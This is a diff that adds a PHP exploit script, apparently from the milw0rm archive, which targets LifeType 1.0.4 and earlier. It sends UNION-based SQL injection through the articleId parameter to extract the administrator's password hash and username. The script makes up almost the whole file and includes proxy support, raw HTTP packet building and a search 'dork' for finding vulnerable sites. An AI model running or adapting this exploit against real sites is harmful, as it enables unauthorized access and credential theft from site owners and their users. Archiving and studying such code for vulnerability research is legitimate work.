@@ -1,0 +1,146 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "LifeType <= 1.0.4_r3270 SQL injection / admin credentials disclosure\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n";
+echo "dork: \"Powered by LifeType\" \"RSS 0.90\" \"RSS 1.0\" \"RSS 2.0\" \"Valid XHTML 1.0 Strict and CSS\"\r\n\r\n";
+/*
+works regardless of magic_quotes_gpc settings
+*/
+
+if ($argc<3) {
+echo "Usage: php ".$argv[0]." host path OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to LifeType\r\n";
+echo "user/pass: you need an account\r\n";
+echo "Options:\r\n";
+echo "   -T[prefix]   specify a table prefix different from 'lt_'\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Example:\r\n";
+echo "php ".$argv[0]." localhost /lt/  \r\n";
+die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+function is_hash($hash)
+{
+ if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
+ else {return false;}
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$prefix="lt_";
+$proxy="";
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+if ($temp=="-T")
+{
+  $prefix=str_replace("-T","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$sql="9999/**/UNION/**/SELECT/**/password,1,1,1,1,1,1,1/**/FROM/**/".$prefix."users/**/WHERE/**/id=1/*";
+$sql=urlencode($sql);
+$packet ="GET ".$p."index.php?op=ViewArticle&articleId=".$sql."&blogId=1 HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("articleId=",$html);
+for ($i=1; $i<=count($temp); $i++)
+{
+$temp2=explode("&",$temp[$i]);
+if (is_hash($temp2[0]))
+{
+  echo "exploit succeeded...\r\n";
+  echo "MD5 hash  -> ".$temp2[0]."\r\n";
+  $sql="9999/**/UNION/**/SELECT/**/user,1,1,1,1,1,1,1/**/FROM/**/".$prefix."users/**/WHERE/**/id=1/*";
+  $sql=urlencode($sql);
+  $packet ="GET ".$p."index.php?op=ViewArticle&articleId=".$sql."&blogId=1 HTTP/1.0\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Cookie: ".$cookie."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  sendpacketii($packet);
+  $temp=explode("articleId=",$html);
+  $temp2=explode("&",$temp[$i]);
+  echo "admin     -> ".$temp2[0]."\r\n";
+  die;
+}
+}
+//if you are here...
+echo "exploit failed...";
+?>
+
+# milw0rm.com [2006-06-03]
